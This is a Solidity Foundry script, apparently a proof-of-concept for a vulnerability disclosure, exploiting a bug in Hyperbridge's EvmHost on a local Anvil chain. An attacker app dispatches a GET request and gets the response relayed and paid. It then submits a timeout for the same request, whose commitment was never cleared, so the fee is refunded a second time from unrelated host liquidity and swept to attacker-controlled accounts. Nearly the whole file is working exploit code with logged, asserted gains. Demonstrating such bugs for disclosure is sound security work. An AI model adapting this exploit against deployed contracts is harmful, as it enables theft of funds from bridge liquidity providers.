// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "forge-std/Script.sol";
import "forge-std/console2.sol";

import "../tests/foundry/TestHost.sol";
import "../tests/foundry/FeeToken.sol";
import "../tests/foundry/TestConsensusClient.sol";
import {HandlerV2} from "../src/core/HandlerV2.sol";
import {HostParams} from "../src/core/EvmHost.sol";
import {HostManagerParams, HostManager} from "../src/core/HostManager.sol";
import {AttackerGetApp} from "../tests/foundry/EvmHostGetResponseTimeoutPoC.t.sol";

import {FeeMetadata} from "@hyperbridge/core/interfaces/IHost.sol";
import {DispatchGet} from "@hyperbridge/core/interfaces/IDispatcher.sol";
import {GetRequest, GetResponse, Message} from "@hyperbridge/core/libraries/Message.sol";
import {GetRequestTimeout} from "@hyperbridge/core/interfaces/IApp.sol";
import {StateMachine} from "@hyperbridge/core/libraries/StateMachine.sol";
import {StorageValue} from "@polytope-labs/solidity-merkle-trees/src/trie/Node.sol";

interface IAnvilRelayerHost {
    function dispatchIncoming(GetResponse memory response, address relayer) external;
    function dispatchTimeOut(GetRequestTimeout memory timeout, FeeMetadata memory meta, bytes32 commitment) external;
}

contract LocalRelayerHandler is HandlerV2 {
    using Message for GetRequest;

    address public owner;
    address public localHost;

    event LocalHostSet(address indexed host);
    event LocalGetResponseSubmitted(address indexed relayer, bytes32 indexed commitment);
    event LocalGetTimeoutSubmitted(address indexed relayer, bytes32 indexed commitment);

    constructor(address owner_) {
        owner = owner_;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "not owner");
        _;
    }

    function setHost(address host_) external onlyOwner {
        require(host_ != address(0), "zero host");
        localHost = host_;
        emit LocalHostSet(host_);
    }

    function submitGetResponse(GetResponse memory response) external {
        require(localHost != address(0), "host not set");
        bytes32 commitment = response.request.hash();
        emit LocalGetResponseSubmitted(msg.sender, commitment);
        IAnvilRelayerHost(localHost).dispatchIncoming(response, msg.sender);
    }

    function submitGetTimeout(GetRequestTimeout memory timeout, FeeMetadata memory meta, bytes32 commitment) external {
        require(localHost != address(0), "host not set");
        emit LocalGetTimeoutSubmitted(msg.sender, commitment);
        IAnvilRelayerHost(localHost).dispatchTimeOut(timeout, meta, commitment);
    }
}

contract GetResponseTimeoutAnvilPoC is Script {
    using Message for GetRequest;

    uint256 internal constant FEE = 10 ether;

    function logBalances(
        string memory label,
        FeeToken token,
        address payer,
        address relayer,
        address app,
        address host,
        address lp
    ) internal view {
        console2.log(label);
        console2.log("attacker payer:", token.balanceOf(payer));
        console2.log("response relayer:", token.balanceOf(relayer));
        console2.log("attacker app:", token.balanceOf(app));
        console2.log("host:", token.balanceOf(host));
        console2.log("liquidity provider:", token.balanceOf(lp));
        console2.log("attacker EOA combined:", token.balanceOf(payer) + token.balanceOf(relayer));
    }

    function run() external {
        uint256 deployerKey = vm.envUint("DEPLOYER_KEY");
        uint256 attackerPayerKey = vm.envUint("ATTACKER_PAYER_KEY");
        uint256 responseRelayerKey = vm.envUint("RESPONSE_RELAYER_KEY");
        uint256 timeoutRelayerKey = vm.envUint("TIMEOUT_RELAYER_KEY");
        uint256 liquidityProviderKey = vm.envUint("LIQUIDITY_PROVIDER_KEY");

        address deployer = vm.addr(deployerKey);
        address attackerPayer = vm.addr(attackerPayerKey);
        address responseRelayer = vm.addr(responseRelayerKey);
        address timeoutRelayer = vm.addr(timeoutRelayerKey);
        address liquidityProvider = vm.addr(liquidityProviderKey);

        console2.log("=== Hyperbridge GET response then timeout real local Anvil PoC ===");
        console2.log("deployer/admin:", deployer);
        console2.log("attacker payer:", attackerPayer);
        console2.log("response relayer:", responseRelayer);
        console2.log("timeout relayer:", timeoutRelayer);
        console2.log("liquidity provider:", liquidityProvider);

        console2.log("STEP 1: deploy repo contracts and local relayer handler using broadcast transactions");
        vm.startBroadcast(deployerKey);

        TestConsensusClient consensusClient = new TestConsensusClient();
        LocalRelayerHandler relayerHandler = new LocalRelayerHandler(deployer);
        FeeToken feeToken = new FeeToken(deployer, "HyperUSD", "USD.h");
        HostManager manager = new HostManager(HostManagerParams({admin: deployer, host: address(0)}));

        uint256[] memory sms = new uint256[](1);
        sms[0] = 2000;

        HostParams memory params = HostParams({
            uniswapV2: address(0),
            admin: deployer,
            hostManager: address(manager),
            handler: address(relayerHandler),
            unStakingPeriod: 21 days,
            challengePeriod: 0,
            consensusClient: address(consensusClient),
            feeToken: address(feeToken),
            hyperbridge: StateMachine.kusama(2000),
            stateMachines: sms
        });

        TestHost host = new TestHost(params);
        manager.setIsmpHost(address(host));
        relayerHandler.setHost(address(host));

        feeToken.transfer(attackerPayer, FEE);
        feeToken.transfer(liquidityProvider, FEE);

        vm.stopBroadcast();

        console2.log("TestConsensusClient:", address(consensusClient));
        console2.log("LocalRelayerHandler:", address(relayerHandler));
        console2.log("FeeToken:", address(feeToken));
        console2.log("HostManager:", address(manager));
        console2.log("TestHost/EvmHost:", address(host));
        console2.log("Host handler:", host.hostParams().handler);
        console2.log("Relayer handler localHost:", relayerHandler.localHost());

        console2.log("STEP 2: attacker deploys app and funds it with real token transfer");
        vm.startBroadcast(attackerPayerKey);
        AttackerGetApp app = new AttackerGetApp(attackerPayer, address(host));
        feeToken.transfer(address(app), FEE);
        vm.stopBroadcast();

        logBalances("Balances after attacker app funding", feeToken, attackerPayer, responseRelayer, address(app), address(host), liquidityProvider);

        uint256 attackerControlledBefore = feeToken.balanceOf(attackerPayer) + feeToken.balanceOf(responseRelayer) + feeToken.balanceOf(address(app));

        console2.log("STEP 3: attacker app dispatches GET request to EvmHost and pays fee");
        bytes[] memory keys = new bytes[](1);
        keys[0] = hex"abcd";

        uint64 timeoutDuration = 1;
        uint64 dispatchTimestamp = uint64(block.timestamp);

        DispatchGet memory get = DispatchGet({
            dest: StateMachine.evm(421614),
            height: 100,
            keys: keys,
            context: hex"1234",
            timeout: timeoutDuration,
            fee: FEE,
            payer: address(app)
        });

        vm.startBroadcast(attackerPayerKey);
        bytes32 commitment = app.dispatchGet(get);
        vm.stopBroadcast();

        GetRequest memory request = GetRequest({
            source: host.host(),
            dest: get.dest,
            nonce: 0,
            from: abi.encodePacked(address(app)),
            timeoutTimestamp: dispatchTimestamp + timeoutDuration,
            keys: keys,
            height: get.height,
            context: get.context
        });

        require(request.hash() == commitment, "commitment mismatch");

        console2.log("GET request commitment:");
        console2.logBytes32(commitment);
        console2.log("Stored request fee after GET:", host.requestCommitments(commitment).fee);
        logBalances("Balances after GET dispatch", feeToken, attackerPayer, responseRelayer, address(app), address(host), liquidityProvider);

        console2.log("STEP 4: response relayer EOA submits GET response through relayer handler");
        StorageValue[] memory values = new StorageValue[](1);
        values[0] = StorageValue({key: keys[0], value: hex"01"});
        GetResponse memory response = GetResponse({request: request, values: values});

        vm.startBroadcast(responseRelayerKey);
        relayerHandler.submitGetResponse(response);
        vm.stopBroadcast();

        console2.log("Response receipt relayer:", host.responseReceipts(commitment).relayer);
        console2.log("BUG: request commitment fee still live after response:", host.requestCommitments(commitment).fee);
        logBalances("Balances after response relayer is paid", feeToken, attackerPayer, responseRelayer, address(app), address(host), liquidityProvider);

        require(feeToken.balanceOf(responseRelayer) == FEE, "response relayer not paid");
        require(host.requestCommitments(commitment).fee == FEE, "request commitment not live after response");

        console2.log("STEP 5: unrelated liquidity provider funds EvmHost with real token transfer");
        vm.startBroadcast(liquidityProviderKey);
        feeToken.transfer(address(host), FEE);
        vm.stopBroadcast();

        logBalances("Balances after unrelated host liquidity funding", feeToken, attackerPayer, responseRelayer, address(app), address(host), liquidityProvider);

        console2.log("STEP 6: timeout relayer EOA submits timeout for same GET request through relayer handler");
        FeeMetadata memory meta = host.requestCommitments(commitment);

        vm.startBroadcast(timeoutRelayerKey);
        relayerHandler.submitGetTimeout(GetRequestTimeout({request: request, relayer: timeoutRelayer}), meta, commitment);
        vm.stopBroadcast();

        logBalances("Balances after timeout refund", feeToken, attackerPayer, responseRelayer, address(app), address(host), liquidityProvider);

        require(feeToken.balanceOf(address(app)) == FEE, "attacker app not refunded");
        require(feeToken.balanceOf(address(host)) == 0, "host not drained by refund");

        console2.log("STEP 7: attacker payer sweeps refunded tokens from attacker app");
        vm.startBroadcast(attackerPayerKey);
        app.sweepFeeToken(attackerPayer);
        vm.stopBroadcast();

        logBalances("Final balances after sweep", feeToken, attackerPayer, responseRelayer, address(app), address(host), liquidityProvider);

        uint256 attackerControlledAfter = feeToken.balanceOf(attackerPayer) + feeToken.balanceOf(responseRelayer) + feeToken.balanceOf(address(app));
        uint256 gain = attackerControlledAfter - attackerControlledBefore;

        console2.log("attacker-controlled combined before exploit:", attackerControlledBefore);
        console2.log("attacker-controlled combined after exploit:", attackerControlledAfter);
        console2.log("attacker EOA net gain from EvmHost liquidity:", gain);

        
        
        require(gain == FEE, "wrong gain");
        require(host.requestCommitments(commitment).sender == address(0), "timeout did not clear stale commitment");

        console2.log("RESULT: real Anvil transactions moved fee tokens from EvmHost liquidity to attacker-controlled EOAs");
        console2.log("RESULT: attacker-controlled balances increased from 10 tokens to 20 tokens");
    }
}
